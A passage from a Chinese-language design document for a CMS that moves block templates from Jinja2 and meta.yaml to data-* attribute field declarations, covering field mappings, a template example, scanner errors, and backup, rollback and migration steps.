  }
  function next() { showSlide((current + 1) % total); }
  function prev() { showSlide((current - 1 + total) % total); }
  if (prevBtn) prevBtn.addEventListener('click', prev);
  if (nextBtn) nextBtn.addEventListener('click', next);
  dots.forEach(function(dot) {
    dot.addEventListener('click', function() {
      showSlide(parseInt(dot.getAttribute('data-slide')));
    });
  });
  setInterval(next, 8000);
})();
</script>
```

### 5.2 字段映射总览

**Section 级 CSS 字段**（`<section data-label="Banner">` → 7 个字段全部自动生成）：

| 内联 CSS | 默认值 | 标签来源 | 属性面板字段 |
|---|---|---|---|
| `height` | `77vh` | `data-label="Banner"` | Banner高度 |
| `max-width` | `100%` | `data-label="Banner"` | Banner最大宽度 |
| `padding-top/right/bottom/left` | `0` | `data-label="Banner"` | Banner上/右/下/左内边距 |
| `background` | `transparent` | `data-label="Banner"` | Banner背景 |

**Section 级非 CSS 字段**（`<meta data-field>`）：

| data-field | data-type | 属性面板控件 |
|---|---|---|
| `overlay_enabled` | select | 下拉：启用 / 不启用 |
| `content_position` | select | 下拉：居中 / 居左 / 居右（值含整段 CSS） |

**Item 级 CSS 字段**（`data-repeat-item` 内各元素的内联样式 → 9 个字段）：

| data-key | 内联 CSS | 默认值 | 标签来源 | 属性面板字段 |
|---|---|---|---|---|---|
| `content` | `max-width` | `900px` | `data-label="内容区"` | 内容区最大宽度 |
| `content` | `text-align` | `center` | `data-label="内容区"` | 内容区文字对齐 |
| `title` | `font-size` | `3rem` | `data-label="标题"` | 标题字号 |
| `title` | `color` | `#ffffff` | `data-label="标题"` | 标题文字颜色 |
| `subtitle` | `font-size` | `1.25rem` | `data-label="副标题"` | 副标题字号 |
| `subtitle` | `color` | `rgba(255,255,255,0.9)` | `data-label="副标题"` | 副标题文字颜色 |
| `btn` | `font-size` | `1rem` | `data-label="按钮"` | 按钮字号 |
| `btn` | `color` | `#ffffff` | `data-label="按钮"` | 按钮文字颜色 |
| `btn` | `background-color` | `#067a7a` | `data-label="按钮"` | 按钮背景色 |

**Item 级非 CSS 字段**（`data-repeat-item` 内 `<meta>` → 9 个字段）：

| data-field | data-type | 属性面板控件 |
|---|---|---|
| `type` | select | 下拉：图片 / 视频 |
| `media` | url | URL 输入 + 图片预览 |
| `title` | text | 文本输入 |
| `subtitle` | text | 文本输入 |
| `primaryBtn` | text | 文本输入 |
| `primaryBtnLink` | url | URL 输入 |
| `primaryBtnLinkTarget` | select | 下拉：是 / 否 |
| `secondaryBtn` | text | 文本输入 |
| `secondaryBtnLink` | url | URL 输入 |

**不是字段的样式**（内联 style 中无 `data-label-*` → 固定值）：

| 位置 | CSS 属性 | 原因 |
|---|---|---|
| `.container` | `height: 100%; max-width: none` | 纯布局，无 data-label-* |
| `.hero-banner-content` | `left / right / transform` | 由 `data-attr-style="content_position"` 注入整段 CSS |
| `.hero-banner-image` | `background-image` | 由 `data-bg="media"` 注入，不是 CSS 字段 |
| 导航按钮 SVG | `width / height / fill / stroke` | 固定图标样式 |

### 5.3 改造要点总结

1. **模板只写纯 HTML + data-* 声明**：零 Jinja2。后处理五个函数依次完成列表展开、CSS 注入、内容注入、条件可见性、Schema 清理
2. **CSS 字段 = 内联 style + data-label / data-label-\***：扫描器从 style 提取默认值，`data-label` 批量自动生成标签（内置字典），`data-label-*` 逐个精确覆盖。`inject_styles()` 根据 data-key 定位元素，追加用户修改值到 style 末尾（CSS 级联覆盖）
3. **内容字段 = data-content / data-src / data-href / data-bg / data-attr-style / data-attr-\***：替代所有 `{{ }}` 变量输出。`inject_content()` 根据属性类型替换文本、src、href、背景图、整段 CSS、任意 HTML 属性
4. **条件可见性 = 空值自动隐藏 + data-show-if**：`data-content`/`data-src`/`data-href`/`data-bg` 的元素字段为空时自动 hidden。`data-show-if` + `data-show-if-value` 处理值判断。互斥组（`data-show-if-default`）替代 `{% if %}`/`{% elif %}`/`{% else %}` 链
5. **列表展开 = expand_repeat_items()**：替代 `{% for %}` 循环和 `{% if items %}` 空列表守护。模板只写一份 data-repeat-item，后处理根据数据数组长度自动克隆。数组为空时删除整个容器
6. **字段声明 = `<meta data-field>`**：定义字段的 type、options、default 等表单元信息，与内容注入属性配合使用

### 5.4 示例：feature_grid 改造

feature_grid 是展示服务/功能亮点的网格模块，包含图标、标题、描述。字段数量多（50+），按元素分组分布在不同 DOM 层级。下面展示改造后的关键部分。

**模板（核心结构，省略部分 CSS 字段声明以减少篇幅）：**

```html
{# 功能特色网格 —— 零 Jinja2 模板 #}
{#
  ══════════ SECTION 级 — <section> ══════════
  data-label 批量生成标签，data-label-max-width 覆盖
  新建模块时管理后台从 site settings 预填 global_width 到此字段
#}
<section class="section"
         style="max-width: 100%;
                padding-top: 2rem; padding-bottom: 2rem;
                margin-top: 0; margin-bottom: 0;
                background: transparent;"
         data-key="section"
         data-label="外层"
         data-placeholder="如 1200px">

  {#
    ══════════ 容器 ══════════
  #}
  <div class="container"
       style="max-width: 1200px; margin: 0 auto;"
       data-key="container"
       data-label="容器">

    {#
      ══════════ 标题区 ══════════
      header_align 控制 text-align，独立 CSS 字段
      其他 margin/padding 也是独立 CSS 字段
    #}
    <div class="section-header"
         style="text-align: center; margin-bottom: 4rem;
                padding-bottom: 2rem; padding-top: 0;
                margin-top: 0; background: transparent;"
         data-key="header"
         data-label="标题区">

      {#
        --- 区块主标题 ---
        data-content 替代 {{ md.title }}，空值自动隐藏
      #}
      <h2 class="section-title"
          style="font-size: 2.25rem; color: #1e293b; margin-bottom: 0.5rem;"
          data-key="section-title"
          data-content="title"
          data-label="区块标题">区块标题占位</h2>

      {#
        --- 区块副标题 ---
      #}
      <p class="section-description"
         style="font-size: 1.125rem; color: #64748b;"
         data-key="section-subtitle"
         data-content="subtitle"
         data-label="区块副标题">副标题占位文本</p>
    </div>

    {#
      ══════════ 网格容器 ══════════
      expand_repeat_items() 根据 features 数据数组克隆卡片
    #}
    <div class="services-grid"
         style="gap: 2rem;"
         data-key="grid"
         data-label="网格"
         data-repeat="features"
         data-repeat-label="功能卡片">

      {# ══════════ 卡片（Item 级，模板项：仅一份）══════════ #}
      <div class="service-card"
           style="padding: 2rem 1.5rem;
                  border-radius: 12px;
                  border: 1px solid #e2e8f0;"
           data-repeat-item
           data-key="card"
           data-label="卡片">

        {#
          --- 图标区 ---
          所有 SVG 放在同一父元素下，靠 data-show-if 互斥组选择
          CSS 属性 → data-label-*；图标名 → <meta data-field>
        #}
        <div class="service-icon"
             style="width: 56px; height: 56px; color: #067a7a;
                    border-radius: 8px; margin-bottom: 0.25rem;
                    margin-right: 0; background-color: transparent;"
             data-key="icon"
             data-label="图标">
          <svg data-show-if="icon" data-show-if-value="circuit" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="4" y="4" width="16" height="16" rx="2"/><path d="M9 9h6v6H9z"/></svg>
          <svg data-show-if="icon" data-show-if-value="code" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
          <svg data-show-if="icon" data-show-if-value="shield" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
          <svg data-show-if="icon" data-show-if-value="zap" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
          {# ... 其余图标省略 ... #}
          <svg data-show-if="icon" data-show-if-default viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
        </div>

        {#
          --- 卡片文字区 ---
        #}
        <div class="service-content">
          {#
            卡片标题 — data-content 注入，空值自动隐藏
          #}
          <h3 class="service-title"
              style="font-size: 1rem; color: #1e293b;
                     font-weight: 600; margin-bottom: 0.5rem;"
              data-key="card-title"
              data-content="title"
              data-label="卡片标题">功能标题占位</h3>

          {#
            卡片描述 — data-content 注入，空值自动隐藏
          #}
          <p class="service-description"
             style="font-size: 0.875rem; color: #64748b; line-height: 1.6;"
             data-key="card-desc"
             data-content="desc"
             data-label="卡片描述">功能描述占位文本</p>
        </div>

        {# --- Item 级字段声明 --- #}
        <meta data-field="icon" data-label="图标" data-type="icon">
        <meta data-field="title" data-label="标题" data-type="text">
        <meta data-field="desc" data-label="描述" data-type="textarea">
      </div>
    </div>
  </div>
</section>

{# --- Section 级非 CSS 字段声明 --- #}
<meta data-field="title" data-label="区块标题" data-type="text" data-group="内容">
<meta data-field="subtitle" data-label="区块副标题" data-type="text" data-group="内容">
```

**字段分布总览：**

| 元素 | data-key | 声明方式 | CSS 字段数 | 内容注入 | 说明 |
|---|---|---|---|---|---|
| `<section>` | `section` | `data-label="外层"` | 6 | — | 外层：宽度、背景、内外边距 |
| `.container` | `container` | `data-label="容器"` | 2 | — | 内层：宽度、外边距 |
| `.section-header` | `header` | `data-label="标题区"` | 6 | — | 标题区：对齐、背景、内外边距 |
| `h2.section-title` | `section-title` | `data-label="区块标题"` | 3 | `data-content="title"` | 区块标题 |
| `p.section-description` | `section-subtitle` | `data-label="区块副标题"` | 2 | `data-content="subtitle"` | 区块副标题 |
| `.services-grid` | `grid` | `data-label="网格"` | 1 | — | 网格间距 |
| `.service-card` (item) | `card` | `data-label="卡片"` | 3 | — | 卡片内边距、圆角、边框 |
| `.service-icon` (item) | `icon` | `data-label="图标"` | 7 | — | 图标尺寸、颜色、背景、边距 |
| `h3.service-title` (item) | `card-title` | `data-label="卡片标题"` | 4 | `data-content="title"` | 卡片标题 |
| `p.service-description` (item) | `card-desc` | `data-label="卡片描述"` | 3 | `data-content="desc"` | 卡片描述 |

**与 hero_banner 的差异：**

| 对比维度 | hero_banner | feature_grid |
|---|---|---|
| 列表项字段数 | 18（含 CSS + 非 CSS） | 20（含 CSS + 非 CSS） |
| 内容注入属性 | `data-content`、`data-href`、`data-src`、`data-bg`、`data-attr-*` | `data-content` 为主 |
| 条件可见性 | `data-show-if`（type 切换 video/image）+ 空值自动隐藏 | `data-show-if` 互斥组（图标多选一）+ 空值自动隐藏 |
| 复杂 Jinja2 保留 | 无（已通过 `data-attr-style` 全部消除） | 无（已全部消除） |
| 典型 pattern | 媒体切换、按钮链接 | 图标互斥组、多元素独立 CSS |

## 六、错误处理规范

扫描器遇到以下情况时**必须报错**（抛出 `BlockScannerError`），给出文件路径 + 行号 + 明确信息：

| 错误场景 | 错误信息格式 |
|---|---|
| `data-label-*` 对应的 CSS 属性不在元素 `style` 中 | `hero_banner/template.html L42: <h1 data-key="title"> 的 style 中缺少 "line-height"（data-label-line-height 要求）` |
| section 级 `data-key` 值重复 | `hero_banner/template.html L10 和 L35: data-key "title" 重复（section 级必须唯一）` |
| section 级字段 key 重复（含 CSS vs meta 冲突） | `hero_banner/template.html: 字段 key "overlay_enabled" 在 L52 <meta> 和 L15 <div data-key="overlay"> 产生冲突` |
| data-repeat-item 内 `data-key` 值重复 | `hero_banner/template.html L60: data-repeat-item 内 data-key "title" 重复` |
| `data-repeat-item` 不是 `data-repeat` 的直接子元素 | `hero_banner/template.html L30: data-repeat-item 必须是 data-repeat 的直接子元素（当前嵌套在 <div class="wrapper"> 内）` |
| `data-repeat` 内找不到 `data-repeat-item` | `hero_banner/template.html L25: data-repeat="slides" 容器内缺少 data-repeat-item` |
| `<meta data-type="select">` 缺少 `data-options` | `hero_banner/template.html L80: <meta data-field="type" data-type="select"> 缺少 data-options` |
| `data-options` 格式无法解析 | `hero_banner/template.html L80: data-options 格式错误，期望 "标签:值, 标签:值"，得到 "图片image,视频"` |
| `<meta>` 缺少必填属性 | `hero_banner/template.html L55: <meta data-field="xxx"> 缺少 data-type` |
| CSS 属性值包含 `;` | `hero_banner/template.html L42: <h1 data-key="title"> 的 style 值包含 ";" 字符，不支持` |

---

## 七、向后兼容策略

### 7.1 检测逻辑

```python
def _has_data_attributes(html: str) -> bool:
    """检测 template.html 是否使用 data-* 声明方式。"""
    return bool(
        re.search(r'data-label-[a-zA-Z0-9\-]+\s*=', html)
        or re.search(r'data-content\s*=', html)
        or re.search(r'data-src\s*=', html)
        or re.search(r'data-href\s*=', html)
        or re.search(r'data-bg\s*=', html)
        or re.search(r'data-show-if\s*=', html)
        or re.search(r'<meta\s+data-field\s*=', html)
    )
```

### 7.2 回退规则

```
template.html 存在？
├── 是 → 含 data-label-* 或 <meta data-field>？
│        ├── 是 → 用 block_scanner 扫描（新方式），忽略 meta.yaml
│        └── 否 → meta.yaml 存在？
│                  ├── 是 → 读 meta.yaml（旧方式）
│                  └── 否 → fields = []（纯静态 block）
└── 否 → meta.yaml 存在？
          ├── 是 → 读 meta.yaml
          └── 否 → fields = []
```

### 7.3 渐进迁移

- 新旧方式可在同一模板的不同 block 中共存
- 一个 block 迁移后删除其 `meta.yaml`
- 如果同时存在 data-* 和 `meta.yaml`：**只用 data-*，不合并**，并在日志中输出 info 提示忽略 meta.yaml

### 7.4 实现要点

`scan_blocks()` 方法（`app/core/template_loader.py`）只读 meta.yaml，需改造为兼容新旧两种方式：

```python
def scan_blocks(self, template_name: str) -> dict:
    """扫描模板下所有 block，返回字段定义 dict。调用方不感知新旧方式差异。"""
    # 1. 读取 template.html
    # 2. 调用 _has_data_attributes() 检测（见 §7.1）
    # 3. 有 data-* → 调用 block_scanner.scan_template_html()（新方式）
    # 4. 无 data-* → 按原逻辑读 meta.yaml（旧方式）
```

新增 `load_all_block_fields()` 方法（详见 §4.6），供 builder.py 使用。

导入 block_scanner：
```python
from app.core.block_scanner import scan_template_html, BlockScannerError
```

---

## 八、迁移操作清单

### 8.1 迁移前备份（必须第一步执行）

备份分两阶段：**基础设施备份**（一次性）和 **Block 模板备份**（每个 Block 迁移前）。

#### 阶段一：基础设施备份（开始写任何代码之前，一次性完成）

以下 6 个共享文件会被大幅修改，**必须在开始任何迁移代码之前一次性全部备份**：

| 文件 | 改动内容 | 风险 |
|---|---|---|
| `app/static/js/admin_modules.js` | 删除 per-block 硬编码分支，新增 `renderListEditor()`，增强 `renderField()` | 高：影响所有 Block 的后台编辑 |
| `app/templates/dashboard/panel_page_edit.html` | 删除 per-block Jinja2 分支 (~1144行) + `addModule()` 分支 (~850行) | 高：影响页面编辑的渲染和新增模块 |
| `app/core/routes.py` | `_parse_modules_form()` 改为数据驱动，删除 6 种 Block 的硬编码列表解析 | 高：影响所有模块的表单提交 |
| `app/core/builder.py` | 在 `_render_for_language()` 中调用 `inject_styles()` / `inject_content()` / `apply_visibility()` / `strip_schema_output()` | 中：影响所有站点的构建输出 |
| `app/core/template_loader.py` | `scan_blocks()` 改造，新增 `load_all_block_fields()` | 中：影响模板扫描和字段加载 |
| `site_templates/dengtec/templates/_modules.html` | 简化 `module.type == 'hero_banner'` 硬编码兼容判断 | 低：单行改动，但影响所有模块渲染 |

备份命令（在项目根目录执行）：

```bash
cp app/static/js/admin_modules.js app/static/js/admin_modules.js.bak
cp app/templates/dashboard/panel_page_edit.html app/templates/dashboard/panel_page_edit.html.bak
cp app/core/routes.py app/core/routes.py.bak
cp app/core/builder.py app/core/builder.py.bak
cp app/core/template_loader.py app/core/template_loader.py.bak
cp site_templates/dengtec/templates/_modules.html site_templates/dengtec/templates/_modules.html.bak
```

**基础设施回滚：** 如果基础设施改动导致问题，用 `.bak` 文件覆盖回原文件即可恢复。git 也可用，但 `.bak` 保证拿到的是迁移前的精确版本（不受后续 git 操作影响）。

#### 阶段二：Block 模板备份（每个 Block 迁移前）

```
blocks/<block名>/template.html      →  blocks/<block名>/template.html.bak
blocks/<block名>/meta.yaml           →  blocks/<block名>/meta.yaml.bak
```

```bash
# 在 block 目录下执行
cp template.html template.html.bak
cp meta.yaml meta.yaml.bak
```

**备份纪律（硬约束）：**

| 规则 | 说明 |
|---|---|
| 阶段一备份必须在任何代码改动前完成 | 6 个基础设施文件缺一不可 |
| 阶段二备份必须在每个 Block 迁移前完成 | 两个文件都必须有 .bak 副本 |
| .bak 文件不可修改 | 备份后只读，作为原始状态的锚点 |
| **绝不主动删除 .bak 文件** | 除非用户明确说"删除备份文件"，否则 .bak 文件永久保留 |
| git 中忽略 .bak | `*.bak` 已加入 `.gitignore`，不提交到仓库 |
| 整个模板迁移完成后再统一清理 | 全部 13 个 Block 迁移验证通过后，由用户决定是否批量删除所有 .bak |

### 8.2 迁移步骤（每个 Block 独立执行）

0. **备份**：`cp template.html template.html.bak && cp meta.yaml meta.yaml.bak`
1. **对照 meta.yaml**，确认所有字段的类型和默认值
2. **CSS 字段**：找到对应 HTML 元素 → 加 `data-key` → 加 `data-label-*` → 确认 style 中有对应 CSS 属性及默认值
3. **非 CSS 字段**：Section 级放 `</section>` 后，item 级放 `data-repeat-item` 内末尾 → 加 `<meta data-field ...>`
4. **列表字段**：容器加 `data-repeat` + `data-repeat-label`，模板项加 `data-repeat-item`
5. **内容注入替代**：将 `{{ item.xxx }}` 替换为 `data-content="xxx"` / `data-src="xxx"` / `data-href="xxx"` / `data-bg="xxx"` 等注入属性
6. **条件判断替代**：将 `{% if item.xxx %}` 去掉（data-content 空值自动隐藏）；将 `{% if item.type == 'xxx' %}` 替换为 `data-show-if` + `data-show-if-value`
7. **验证**：运行 `flask --app run scan-templates`，检查无报错，字段列表与 meta.yaml.bak 一致
8. **对比输出**：用旧模板和新模板各构建一次站点，diff output/ 确认渲染结果一致

### 8.3 回滚机制

每个 Block 迁移后必须可以独立回滚，不影响其他 Block。回滚利用 .bak 文件（优先级高于 git，因为 git 中可能有多轮修改）。

**回滚步骤（单 Block）：**

```
1. cp template.html.bak template.html    # 恢复原始模板
2. cp meta.yaml.bak meta.yaml            # 恢复原始 Schema
3. flask --app run scan-templates        # 验证扫描正常
4. 启动 dev server 检查后台页面编辑功能正常
```

**回滚原理：**
- template.html.bak 是迁移前的 Jinja2 版本，直接覆盖即可恢复
- meta.yaml.bak 是原始字段声明，恢复后扫描器走旧方式
- 扫描器检测到 template.html 中没有 `data-label-*`，自动回退到读 meta.yaml
- 其他 Block 不受影响（新旧方式可在同一模板中共存）

**安全规则：**
- 迁移一个 Block 期间**不提交 git**，直到该 Block 验证通过
- 验证不通过 → 立即执行回滚步骤，排查问题后重试
- 验证通过 → 提交该 Block 的改动（commit message: `refactor: <block名> 迁移到 data-* 字段声明`）
- .bak 文件**不删除**，继续保留作为原始参照

### 8.4 渐进式迁移顺序

按 Block 复杂度从低到高排列，每个 Block 验证通过后再迁移下一个：

| 优先级 | Block | 复杂度 | 说明 |
|---|---|---|---|
| 1 | hero_banner | 高 | 含 CSS 字段 + select + toggle + 列表，作为样板 |
| 2 | section_title | 低 | 纯 CSS 字段，无列表 |
| 3 | text_content | 低 | 纯 CSS 字段 |
| 4 | contact_info | 低 | 纯文本字段，无列表 |
| 5 | highlight_card | 中 | CSS 字段 + 列表 + 变体 |
| 6 | stat_counter | 中 | CSS 字段 + 列表 |
| 7 | logo_cloud | 中 | CSS 字段 + 列表 |
| 8 | feature_grid | 中 | CSS 字段 + 列表 |
| 9 | process_steps | 中 | CSS 字段 + 列表 |
| 10 | contact_form | 中 | 混合字段 |
| 11 | data_grid | 高 | 数据集绑定 + 复杂列表渲染 |
| 12 | product_grid | 高 | 数据集绑定 + 卡片布局 |
| 13 | item_detail | 中 | 双列表（images/specs）+ 详情页面渲染。数据全在 `module.data` 中，是自包含模块，不使用 `all_datasets` |
| — | item_data | — | **暂不迁移**：含 `isDatasetMode`/`editItem` 特殊上下文，与 data-repeat 机制不同，保留其 `specialEditor` 硬编码（详见 §10-15） |

先迁移 hero_banner 作为样板，验证整套机制跑通后推进低复杂度 Block。**数据集绑定的 2 个 Block（data_grid / product_grid）排在最后**，因为它们涉及 `all_datasets` 数据源绑定、动态字段映射、`_modules.html` 的 `detail` 路由等额外复杂度，需要基础设施在简单 Block 上充分验证后再处理。item_detail 虽然含双列表，但数据全在 `module.data` 中，是自包含模块，迁移复杂度低于 data_grid/product_grid。item_data 因其特殊的条目编辑上下文（`isDatasetMode` / `editItem`）暂不迁移。

### 8.5 完成后更新 Skill 文档

**触发条件（全部满足后才执行）：**
1. 全部 13 个 Block 迁移完成（item_data 暂不迁移，详见 §10-15）
2. 店主后台（admin 面板）每个 Block 的属性编辑、保存、数据回显均正常
3. 模板预览（`flask --app run build-site` 或预览模式）构建无报错
4. 静态站点输出与迁移前 diff 一致（或仅有预期的空格/换行差异）
5. 开发者用新方式新建一个测试 Block，从扫描到构建全链路跑通

**需更新的 Skill：**

| Skill | 改动内容 |
|---|---|
| `template-new-block` | 新增 Block 的流程从"创建 meta.yaml + template.html"改为"创建 template.html（含 data-* 属性）" |
| `template-new-template` | 如果模板脚手架中引用了 meta.yaml 示例，同步更新为 data-* 示例 |

**更新前必须确认：** 上述 5 个条件全部通过，且用户明确指令"更新 skill"。

**在更新 Skill 之前：** 新旧两种方式共存，`template-new-block` 等 skill 继续按 meta.yaml 方式指导。开发文档（本文档）是 data-* 新方式的唯一权威参考。

---

## 九、消除"四处同步" —— data-* 模式的核心优势

### 9.1 当前痛点

在 meta.yaml 模式下，新增或修改一个 Block 的样式编辑表单，必须手动同步**四处**代码：

| # | 文件 | 位置 | 用途 |
|---|------|------|------|
| 1 | `app/templates/dashboard/panel_page_edit.html` | Jinja2 模板 (~112-1017行) | 已保存模块的服务端渲染 |
| 2 | `app/templates/dashboard/panel_page_edit.html` | `addModule()` 函数 | 新增模块的客户端 JS 生成 |
| 3 | `app/static/js/admin_modules.js` | `buildModuleHTML()` 函数 | 数据集编辑器的模块表单 |
| 4 | `app/core/routes.py` | `_parse_modules_form()` 函数 | 表单提交后的数据解析 |

**漏改任何一处，用户会看到不一致的界面，或提交的数据丢失。** 四处代码风格不同（Jinja2 vs JS 字符串拼接 vs JS DOM 操作 vs Python 字典解析），字段顺序、分组标签、单位数组必须完全一致。这是当前系统最大的维护负担。

根本原因：admin_modules.js 中存在**按 block type 硬编码的样式编辑器**（`specialEditor` / `styleEditor`），routes.py 中存在**按 block type 硬编码的列表字段解析逻辑**（如 hero_banner slides 的 `module_N_slide_count` / `module_N_slide_S_*` 前缀解析，约 1834-1902 行），它们覆盖/绕过了动态字段机制，破坏了数据驱动的渲染。

### 9.2 data-* 模式的解决方案

data-* 模式将字段定义下沉到 template.html，渲染完全由字段列表驱动：

```
template.html（data-* 属性）
    │
    ▼
block_scanner 提取字段定义
    │
    ▼
字段列表 → admin_modules.js 的 renderField() 动态渲染
    │
    ▼
所有表单控件均由字段类型决定，无需手动写三处 HTML
```

**核心目标：template.html 是唯一需要修改的文件。** 加字段 = 在 HTML 元素上加 `data-label-*`；改字段 = 改 `data-label-*` 的值；删字段 = 删 `data-label-*` 属性。扫描器和 admin JS 自动跟进。

### 9.3 实现时的硬约束

为实现"零硬编码"目标，基础设施搭建阶段必须做到以下 11 点：

**A. 增强 `renderField()` 的控件类型支持**

当前 `renderField()` 只区分 `textarea` / `select` / `number` 三种，其余全部回退为 `<input type="text">`。必须新增以下类型支持：

| 新增 type | 生成控件 | 说明 |
|---|---|---|
| `color` | `color` | 颜色选择器（复合控件：颜色输入框 + 文本输入框，与现有 `cn()` 函数等效） |
| `url` | `<input type="url">` + 图片预览 | 输入框 + 小缩略图（若值为图片 URL） |

现有行为保留并文档化：`renderField()` 在字段 key 匹配 `/image|cover|background|media|photo|logo/i` 时自动追加 `<input type="file">` 上传控件。**这个行为不变**，意味着 key 中包含 `image`、`media` 等关键词的字段会自动获得上传能力。模板作者在为 `data-label-background-image` 之类的字段起名时，key 中自然会包含 `media` 或 `image`，无需额外处理。

施工顺序：在迁移 hero_banner **之前**完成 renderField() 增强，并回归验证其他 13 个 Block 的旧模式渲染不受影响。

**B. 单位选择器改为 `renderField()` 的通用能力**

当前单位选择器由 `un()` 辅助函数生成 `input + select.unit-picker` 复合控件，但 `un()` 是硬编码在各处调用的。必须将其集成到 `renderField()` 中：

渲染逻辑：
```
如果 field 定义中包含 units 列表 →
  生成 <div class="input-group-sm">
    <input type="text" value="...">
    <select class="unit-picker" onchange="...">
      <option>px</option> ...（第一个为默认单位）
    </select>
  </div>
```

`renderField()` 的调用方（panel_page_edit.html 的 Jinja2 部分、addModule()、admin_modules.js 的 buildModuleHTML()）全部改为调用同一个 `renderField()`，不再各自硬编码单位选择器。

扫描器在 field 定义中附加 `units` 字段，`renderField()` 据此决定是否渲染单位选择器。

**单位推断表（CSS 属性 → 可选单位列表）：**

| CSS 属性 | 可选单位 | 默认单位 |
|---|---|---|
| `width`, `min-width`, `max-width` | px, %, rem, vw | px |
| `height`, `min-height`, `max-height` | px, vh, rem, % | px |
| `font-size` | px, rem, em | rem |
| `padding`, `padding-*` | px, rem, % | px |
| `margin`, `margin-*` | px, rem, % | px |
| `border-radius` | px, rem, % | px |
| `border-width` | px, rem | px |
| `line-height` | rem, — (无单位) | rem |
| `letter-spacing` | px, rem, em | px |
| `gap`, `row-gap`, `column-gap` | px, rem | px |
| 其他 | px, rem | px |

推断规则：扫描器根据 `_css_prop` 查找上表，将 `units` 列表写入字段定义。上表未列出的 CSS 属性默认使用 `["px", "rem"]`。第一个单位为默认单位。

**C. `_parse_modules_form()` 改为数据驱动**

当前 routes.py 的 `_parse_modules_form()` 对 6 种 Block 的列表字段有硬编码解析（hero_banner 的 slides、feature_grid 的 features、stat_counter 的 stats、logo_cloud 的 logos、process_steps 的 steps、item_detail 的 images/specs）。必须改为通用逻辑：

```
解析流程（数据驱动）：
1. 遍历请求中的 module_N_data_* 键，构建扁平 dict
2. 对照 block 的字段定义，找到 type=list 的字段
3. 对于列表字段，从 form 中有序提取每项的 item_fields
4. 输出与 YAML 存储格式一致的结构
```

**统一序列化格式：**

列表字段的 form 命名统一为 `module_N_data_<listKey>_<index>_<itemField>`：

```
module_0_data_slides_0_type     → slides[0].type
module_0_data_slides_0_media    → slides[0].media
module_0_data_slides_0_title    → slides[0].title
module_0_data_slides_1_type     → slides[1].type
...
```

- `listKey` 使用 `data-repeat` 的值（如 `slides`，不是 `slide`）
- `data_` 前缀与非列表字段的 `module_N_data_<field>` 命名保持一致
- `index` 从 0 开始，连续递增
- `itemField` 使用扫描器输出的字段 key

**与现有格式的差异（仅改 JS 端，不影响已存储数据）：**

| Block | 现有 form 前缀 | 迁移后 |
|---|---|---|
| hero_banner | `module_N_slide_S_` | `module_N_data_slides_S_` |
| feature_grid | `module_N_feature_S_` | `module_N_data_features_S_` |
| stat_counter | `module_N_stat_S_` | `module_N_data_stats_S_` |
| logo_cloud | `module_N_logo_S_` | `module_N_data_logos_S_` |
| process_steps | `module_N_step_S_` | `module_N_data_steps_S_` |
| item_detail | `module_N_data_images_S_` | 不变（已使用 data_ 前缀） |

列表项计数器的隐藏字段也统一为 `module_N_data_<listKey>_count`，替代当前的 `module_N_slide_count`、`module_N_feature_count` 等。

**D. `global_width` 回退处理**

`outer_width` 的回退链由模板层改为管理后台预填：

```
新建模块时 → 后台读取 settings.layout.global_width → 预填到"外层宽度"输入框
                ↓ 用户保存
             module.data.section_max_width = "1200px"
                ↓ inject_styles()
              追加 "max-width: 1200px;" 覆盖模板默认值 "100%"
```

模板内联 style 只需写硬兜底值：

```html
<section style="max-width: 100%; ..."
         data-label-max-width="外层宽度">
```

- 用户保存过 → `inject_styles()` 追加覆盖，使用用户值
- 用户新建但未保存 → 管理后台显示 `global_width` 作为 placeholder/预填值
- 模板不需要 `{{ settings }}`，不需要 Jinja2

**E. 文件上传控件触发规则（隐式行为，模板作者须知）**

`renderField()` 中有一项**现有行为**需要保留：字段 key 匹配 `/image|cover|background|media|photo|logo/i` 时自动追加 `<input type="file">`。这意味着：

- `data-key="media_bg"` + `data-label-background-image` → key = `media_bg_background_image` → 匹配 `image` → 自动带上文件上传
- `data-key="btn"` + `data-label-background-color` → key = `btn_background_color` → 匹配 `background` → 也会带上文件上传（误触发）

**模板作者注意事项：** 如果某个颜色字段的 key 意外包含了上述关键词（如 `section_background` 因为包含 `background` 而触发上传控件），可以通过 `<meta data-field>` 声明同名字段来覆盖 type，或者接受多一个上传按钮（无害）。

**F. `data-unit-<prop>` 覆盖（Phase 2，v1 不实现）**

如果某个 Block 的 width 字段不需要 vw 单位，可以加 `data-unit-max-width="px,%,rem"` 覆盖。v1 先用自动推断，遇到特殊需求再打开此能力。

**G. 字段顺序由扫描器输出顺序决定**

扫描器按 template.html 中字段的出现顺序输出，admin JS 按此顺序渲染。模板作者通过调整 `data-label-*` 在 HTML 中的位置来控制后台属性面板的字段排列。

**H. 列表项编辑器 —— 通用 `renderListEditor()`**

当前每个含列表的 Block 有自己的一套 JS 函数生成列表项编辑 HTML：

| Block | 添加函数 | 项 HTML 函数 |
|---|---|---|
| hero_banner | `_addHeroSlide()` | `_heroSlideHtml()` |
| feature_grid | `_addFeatureItem()` | `_featureItemHtml()` |
| stat_counter | `_addStatItem()` | `_statItemHtml()` |
| logo_cloud | `_addLogoItem()` | `_logoItemHtml()` |
| process_steps | `_addStepItem()` | `_stepItemHtml()` |

data-* 模式统一为一个通用函数：

```javascript
// admin_modules.js 新增
function renderListEditor(moduleIdx, listKey, itemFields, existingItems) {
  // itemFields: 扫描器输出的 item_fields 列表
  // existingItems: 已保存的列表数据（编辑模式回填）
  // 返回: 完整的列表编辑器 HTML（含添加按钮 + 项列表容器）
  //
  // 每项渲染：遍历 itemFields，对每个 field 调用 renderField()
  // 表单 name 格式：module_{idx}_data_{listKey}_{itemIndex}_{fieldKey}
  // 每项一个删除按钮，onclick 时移除该 .list-item 并触发重编号
}
```

